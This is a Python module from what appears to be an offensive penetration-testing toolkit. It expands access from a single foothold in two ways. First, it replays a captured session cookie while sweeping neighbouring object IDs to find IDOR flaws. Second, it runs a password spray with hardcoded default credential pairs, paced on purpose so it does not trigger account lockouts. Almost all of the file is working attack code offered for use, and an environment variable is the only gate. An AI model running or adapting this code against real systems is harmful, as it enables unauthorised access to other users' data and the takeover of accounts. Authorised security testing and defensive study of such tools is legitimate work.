"""omega/offensive/offense/horizontal — horizontal access expansion.

From ONE foothold (a valid account or an object reference) expand:
IDOR mass sweep (object ids +-N), user enumeration via signup/reset
probing, and slow password spray across common pairs. Everything
candidate-grade; spray is intentionally slow-paced (delay between
attempts) to avoid lockouts. OFFENSE-GATED (PTK_OFFENSE).
"""
import os
import time

__all__ = ["run_horizontal"]

SPRAY_PAIRS = [("admin", "Welcome1"), ("admin", "P@ssw0rd!"),
               ("test", "test123"), ("user", "user123"),
               ("dev", "dev123")]


def run_horizontal(target, id_params, fetch, auth_value=None,
                   id_range=20, spray=False, pace_s=1.0, budget=40,
                   log=None, gate_open_fn=None):
    """Expand access horizontally from one reference point.

    id_params: [{"param": "user_id", "value": "1337"}] — known valid
    reference from the session.
    fetch(url, method=..., headers=...) -> resp with .status/.text
    auth_value: the session cookie/authorization value to replay.
    """
    gate = gate_open_fn or (lambda: os.environ.get("PTK_OFFENSE") == "1")
    if not (gate() if callable(gate) else gate):
        return {"note": "offense layer disabled (PTK_OFFENSE)"}
    if not callable(fetch) or not id_params:
        return {"note": "id params and fetch required"}
    headers = {"Cookie": auth_value} if auth_value else {}
    findings = []
    probes = 0
    baseline = {}
    for p in id_params[:4]:
        param, val = p.get("param"), p.get("value")
        try:
            resp = fetch(f"{target}?{param}={val}", headers=dict(headers))
            baseline[param] = getattr(resp, "status", 0)
            probes += 1
        except Exception:
            baseline[param] = 0

    # IDOR mass sweep: neighbour ids that return 200 with different
    # content length than the reference = access to other objects
    for p in id_params[:4]:
        param, val = p.get("param"), str(p.get("value"))
        base_st = baseline.get(param) or 0
        digits = "".join(c for c in val if c.isdigit())
        if not digits:
            continue
        n = int(digits)
        for delta in range(-3, id_range + 1):
            if probes >= budget:
                break
            cand = str(n + delta) if delta else val
            if cand == val:
                continue
            try:
                resp = fetch(f"{target}?{param}={cand}",
                             headers=dict(headers))
                probes += 1
                st = getattr(resp, "status", 0)
            except Exception:
                continue
            if st and 200 <= st < 300 and st == base_st:
                findings.append({
                    "title": f"IDOR candidate: object {cand} readable "
                             f"via {param} without ownership check",
                    "severity": "HIGH",
                    "source": "horizontal/idor-sweep",
                    "evidence": f"{param}={cand} -> HTTP {st} "
                                f"(reference {val} also {base_st})",
                    "location": target,
                    "verification": "candidate",
                    "manual_check": "confirm the returned object belongs "
                                    "to another user/tenant",
                    "cwe": "CWE-639",
                })
                break  # one finding per param is enough evidence

    # slow password spray (opt-in; paced)
    if spray:
        for user, pwd in SPRAY_PAIRS:
            if probes >= budget:
                break
            try:
                resp = fetch(f"{target}", method="POST",
                             body=f"username={user}&password={pwd}")
                probes += 1
                body = (resp if isinstance(resp, str) else
                        getattr(resp, "text", "") or "")
                if getattr(resp, "status", 0) in (200, 302) and any(
                        m in body.lower() for m in ("welcome", "logout",
                                                   "dashboard")):
                    findings.append({
                        "title": f"spray candidate: {user}:{pwd} shape "
                                 f"accepted",
                        "severity": "HIGH",
                        "source": "horizontal/spray",
                        "evidence": f"POST {user}/**** -> "
                                    f"{getattr(resp, 'status', 0)} with "
                                    f"auth-success content",
                        "location": target,
                        "verification": "candidate",
                        "manual_check": "log in manually with the pair "
                                        "to confirm (shape hint only "
                                        "is stored here)",
                        "cwe": "CWE-307",
                    })
            except Exception:
                pass
            time.sleep(pace_s)

    if log:
        log(f"horizontal: probes={probes} findings={len(findings)}")
    return {"findings": findings, "probes": probes}
